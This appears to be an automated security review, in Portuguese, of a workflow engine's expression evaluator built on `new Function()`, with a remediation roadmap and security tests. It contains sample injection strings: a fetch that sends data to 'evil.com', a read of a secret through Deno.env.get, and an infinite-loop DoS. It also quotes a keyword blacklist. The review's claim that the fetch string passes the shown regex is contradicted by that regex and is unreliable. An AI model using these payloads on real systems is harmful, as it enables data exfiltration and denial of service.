# 🔀 CONDITIONAL NODE - ANÁLISE E ROADMAP

## 📊 STATUS ATUAL

### **DESCOBERTA CRÍTICA: Confusão de Conceitos**

Existem **DOIS sistemas diferentes** sendo chamados de "Condition":

#### 1️⃣ **APPROVAL/DECISION NODE** (UI Atual)
- **Arquivo**: `src/components/workflow-editor/ConditionConfig.tsx`
- **Propósito**: Decisão humana (analista aprova/rejeita)
- **Funcionalidade**: 
  - Pergunta ao analista
  - Atribuição de responsáveis
  - Pausa workflow aguardando input manual
- **Status**: ✅ **IMPLEMENTADO e FUNCIONAL**

#### 2️⃣ **CONDITIONAL EXECUTOR** (Backend)
- **Arquivos**: 
  - `supabase/functions/execute-workflow/executors/condition-executor.ts`
  - `supabase/functions/execute-workflow/orchestrator/conditional-navigator.ts`
- **Propósito**: Avaliação automática de expressões
- **Funcionalidade**:
  - Avaliar expressões JavaScript/lógicas
  - Rotear fluxo baseado em condições programáticas
  - Sem intervenção humana
- **Status**: ⚠️ **IMPLEMENTADO MAS SEM UI**

---

## 🔍 ANÁLISE TÉCNICA DO CONDITIONAL EXECUTOR

### **Engine de Avaliação**
- **Método**: `new Function()` constructor
- **Segurança**: ⚠️ Moderada (não é `eval()` direto, mas ainda vulnerável)
- **Performance**: ❌ Sem timeout

### **Código Atual (Simplified)**
```typescript
// condition-executor.ts (linha 73-100)
private safeEval(expression: string): boolean {
  // Validação básica
  const allowedPattern = /^[\s\d+\-*/%()<=>&|!"'.\w]+$/;
  if (!allowedPattern.test(expression)) {
    throw new Error('Expressão contém caracteres não permitidos');
  }
  
  // Blacklist de palavras perigosas
  const dangerous = ['eval', 'Function', 'constructor', 'prototype', '__proto__'];
  for (const keyword of dangerous) {
    if (expression.includes(keyword)) {
      throw new Error(`Palavra-chave não permitida: ${keyword}`);
    }
  }
  
  // Executar
  const func = new Function(`
    "use strict";
    return (${expression}) ? true : false;
  `);
  
  return func(); // ⚠️ SEM TIMEOUT!
}
```

---

## 📈 SCORES DE QUALIDADE

| Critério | Score | Detalhes |
|----------|-------|----------|
| **Segurança** | 4/10 | `new Function()` vulnerável, validação superficial |
| **Funcionalidade** | 6/10 | Suporta expressões complexas mas limitado |
| **UI/UX** | 2/10 | ❌ Não tem UI para expressões condicionais |
| **Performance** | 5/10 | ❌ Sem timeout, ❌ sem cache |
| **Manutenibilidade** | 4/10 | Código duplicado em 2 arquivos |

---

## ✅ OPERADORES SUPORTADOS

### **Funcionam Corretamente**
```typescript
// Comparação
"10 > 5"                              // ✅
"{context.age} >= 18"                 // ✅
"{context.status} === 'active'"       // ✅

// Lógicos
"true && false"                       // ✅
"true || false"                       // ✅
"!true"                               // ✅

// Complexos
"{context.user.role} === 'admin' && {context.user.verified}" // ✅

// Aritméticos
"{context.value} * 2 > 100"           // ✅
```

### **Não Funcionam**
```typescript
// Null-safe (sintaxe moderna)
"{context.user?.name}"                // ❌ Erro de sintaxe
"{context.value} ?? 'default'"        // ❌ Não suportado

// Métodos de Array/String (PERIGO de segurança)
"{context.items}.map(x => x.id)"      // ⚠️ Funciona mas permite código arbitrário
"{context.text}.match(/regex/)"       // ⚠️ Vulnerável
```

---

## 🚨 VULNERABILIDADES IDENTIFICADAS

### **1. Code Injection**
```typescript
// Expressão maliciosa pode executar código arbitrário
const malicious = "fetch('http://evil.com?data=' + JSON.stringify(context))";

// ❌ Atual: Passa na validação!
// Regex permite "fetch" (palavra comum)
```

### **2. Denial of Service (DoS)**
```typescript
// Loop infinito trava execução
const dos = "while(true) {}";

// ❌ Sem timeout = servidor trava
```

### **3. Access to Global Scope**
```typescript
// Pode acessar globals do Deno
const leak = "Deno.env.get('SECRET_KEY')";

// ⚠️ `new Function()` tem acesso limitado ao escopo, mas não totalmente isolado
```

---

## 🎯 GAPS E NECESSIDADES

### **❌ FALTA: UI para Expressões Condicionais**

**Atual**: 
- `ConditionConfig.tsx` é para **aprovação humana**
- Não há como configurar expressões automáticas visualmente

**Necessário**:
1. **Editor de Expressões**
   - Syntax highlighting
   - Autocomplete de variáveis
   - Validação em tempo real

2. **Visual Builder**
   ```
   [Campo: context.age] [Operador: >=] [Valor: 18]
   [  AND  ]
   [Campo: context.verified] [Operador: ===] [Valor: true]
   ```

3. **Preview/Test**
   - Testar expressão com dados de exemplo
   - Ver resultado antes de salvar

### **❌ FALTA: Segurança Adequada**

**Opções (do mais seguro ao mais flexível)**:

#### **Opção 1: JSON Logic** (RECOMENDADO)
```typescript
import jsonLogic from 'json-logic-js';

// Estruturado, type-safe, sem eval
const rule = {
  "and": [
    { ">=": [{ "var": "context.age" }, 18] },
    { "===": [{ "var": "context.verified" }, true] }
  ]
};

const result = jsonLogic.apply(rule, context);
```

**Prós**:
- ✅ 100% seguro (não permite código arbitrário)
- ✅ Serializável (JSON)
- ✅ Fácil validar

**Contras**:
- ❌ Sintaxe verbosa
- ❌ Menos intuitivo para usuários técnicos

#### **Opção 2: AST Parser + Sandbox**
```typescript
import { parse } from '@typescript-eslint/parser';

// Parse para AST e validar estrutura
const ast = parse(expression);

// Permitir apenas: BinaryExpression, LogicalExpression, Literal
// Bloquear: CallExpression, FunctionDeclaration, etc.
```

**Prós**:
- ✅ Sintaxe JavaScript natural
- ✅ Validação estrutural

**Contras**:
- ❌ Complexo de implementar
- ⚠️ Ainda requer sandbox de execução

#### **Opção 3: Simple Comparator** (Limitado)
```typescript
// Apenas comparações diretas
{
  field: "context.age",
  operator: "greater_than_or_equal",
  value: 18
}
```

**Prós**:
- ✅ 100% seguro
- ✅ Fácil UI

**Contras**:
- ❌ Muito limitado (sem AND/OR complexos)

### **❌ FALTA: Timeout de Execução**
```typescript
// Necessário: Abortar após X ms
const controller = new AbortController();
const timeout = setTimeout(() => controller.abort(), 100);

// Executar com timeout
try {
  const result = await executeWithTimeout(expression, context, controller.signal);
} finally {
  clearTimeout(timeout);
}
```

### **❌ FALTA: Validação Pré-Salvar**
```typescript
// Validar sintaxe ANTES de salvar workflow
function validateExpression(expr: string): { valid: boolean; error?: string } {
  try {
    // Tentar parsear
    const ast = parse(expr);
    
    // Validar estrutura
    if (!isValidAST(ast)) {
      return { valid: false, error: 'Expressão contém operações não permitidas' };
    }
    
    return { valid: true };
  } catch (err) {
    return { valid: false, error: err.message };
  }
}
```

---

## 🛠️ ROADMAP DE MELHORIAS

### **FASE 1: Segurança (P0 - CRÍTICO)**
**Prazo**: 1 semana

- [ ] Implementar timeout de execução (100ms)
- [ ] Melhorar validação (AST ou JSON Logic)
- [ ] Adicionar sandbox isolado
- [ ] Testes de segurança (tentar bypass)

### **FASE 2: UI (P1 - IMPORTANTE)**
**Prazo**: 2 semanas

- [ ] Criar `ConditionalExpressionConfig.tsx`
- [ ] Editor de expressões com syntax highlighting
- [ ] Visual builder (drag-and-drop de condições)
- [ ] Preview com dados de teste
- [ ] Validação em tempo real

### **FASE 3: Funcionalidades (P2 - DESEJÁVEL)**
**Prazo**: 1 semana

- [ ] Suporte a null-safe (`?.`, `??`)
- [ ] Cache de resultados (performance)
- [ ] Logs estruturados de decisões
- [ ] Métricas (quantas vezes cada branch foi tomado)

### **FASE 4: Integração (P2)**
**Prazo**: 3 dias

- [ ] Unificar `condition-executor.ts` e `conditional-navigator.ts`
- [ ] Criar módulo compartilhado `expression-evaluator.ts`
- [ ] Documentação completa
- [ ] Exemplos de uso

---

## 📚 COMPARAÇÃO COM OUTROS ENGINES

### **n8n IF Node**
```json
{
  "conditions": {
    "boolean": [
      {
        "value1": "={{$json.age}}",
        "operation": "largerEqual",
        "value2": 18
      }
    ]
  }
}
```
**Abordagem**: Estruturado (não usa eval)

### **Temporal Workflow**
```typescript
if (context.user.age >= 18 && context.user.verified) {
  await activities.processAdult();
} else {
  await activities.processMinor();
}
```
**Abordagem**: Código imperativo (TypeScript nativo)

### **Camunda BPMN**
```xml
<exclusiveGateway id="Gateway_1">
  <sequenceFlow targetRef="Task_adult">
    <conditionExpression xsi:type="tFormalExpression">
      ${user.age >= 18 &amp;&amp; user.verified}
    </conditionExpression>
  </sequenceFlow>
</exclusiveGateway>
```
**Abordagem**: Expressões JUEL (sandbox seguro)

---

## 🧪 TESTES RECOMENDADOS

### **1. Testes de Segurança**
```typescript
const securityTests = [
  {
    name: 'Prevenir code injection',
    expression: "fetch('http://evil.com')",
    shouldFail: true
  },
  {
    name: 'Prevenir DoS',
    expression: "while(true) {}",
    shouldFail: true
  },
  {
    name: 'Prevenir acesso a globals',
    expression: "Deno.env.get('SECRET')",
    shouldFail: true
  }
];
```

### **2. Testes de Funcionalidade**
```typescript
const functionalTests = [
  {
    name: 'Comparação simples',
    expression: "{context.age} >= 18",
    context: { age: 20 },
    expected: true
  },
  {
    name: 'Lógica complexa',
    expression: "{context.role} === 'admin' && {context.active}",
    context: { role: 'admin', active: true },
    expected: true
  },
  {
    name: 'Propriedades aninhadas',
    expression: "{context.user.profile.verified}",
    context: { user: { profile: { verified: true } } },
    expected: true
  }
];
```

### **3. Testes de Performance**
```typescript
const performanceTests = [
  {
    name: 'Timeout em loop infinito',
    expression: "while(true) {}",
    expectedError: 'Timeout exceeded'
  },
  {
    name: 'Expressão complexa < 100ms',
    expression: "Array.from({length: 1000}).every((_, i) => i < 1000)",
    maxTime: 100 // ms
  }
];
```

---

## 🎯 CRITÉRIOS DE ACEITAÇÃO

### **Segurança (Obrigatório)**
- [ ] Não permite `eval()`, `Function()`, `constructor`
- [ ] Não permite acesso a `fetch()`, `XMLHttpRequest`
- [ ] Não permite loops infinitos (timeout < 100ms)
- [ ] Não permite acesso a `Deno`, `process`, globals
- [ ] Validação passa em todos os testes de segurança

### **Funcionalidade (Obrigatório)**
- [ ] Suporta comparações: `==`, `!=`, `>`, `<`, `>=`, `<=`
- [ ] Suporta lógicos: `&&`, `||`, `!`
- [ ] Suporta variáveis aninhadas: `{context.user.name}`
- [ ] Validação pré-salvar (sintaxe correta)
- [ ] Feedback visual de erros

### **UI/UX (Desejável)**
- [ ] Editor de expressões com highlighting
- [ ] Autocomplete de variáveis disponíveis
- [ ] Visual builder (AND/OR)
- [ ] Preview com dados de teste
- [ ] Documentação inline (tooltips)

### **Performance (Desejável)**
- [ ] Avaliação < 100ms
- [ ] Cache de resultados frequentes
- [ ] Métricas de uso (quantas vezes cada branch)

---

## 💡 RECOMENDAÇÃO FINAL

**PRIORIDADE 1**: Implementar **JSON Logic** (segurança máxima)

**Motivo**:
- ✅ Elimina 100% dos riscos de code injection
- ✅ Fácil criar UI visual (drag-and-drop)
- ✅ Serializável e versionável
- ✅ Battle-tested (usado em produção por n8n, Zapier)

**Trade-off**:
- Usuários técnicos preferem JavaScript puro
- Sintaxe menos intuitiva

**Solução**: Oferecer **DOIS MODOS**:
1. **Visual Mode**: JSON Logic (drag-and-drop, seguro)
2. **Expert Mode**: JavaScript restrito (AST validado, timeout)

---

## 📞 PRÓXIMOS PASSOS

1. **Decisão de Arquitetura**: JSON Logic vs AST Parser
2. **Criar UI**: `ConditionalExpressionConfig.tsx`
3. **Refatorar Backend**: Unificar executores
4. **Testes de Segurança**: Red team testing
5. **Documentação**: Guia de uso para desenvolvedores

---

**Última Atualização**: 2025-01-08  
**Versão**: 1.0  
**Autor**: Análise Técnica Automatizada
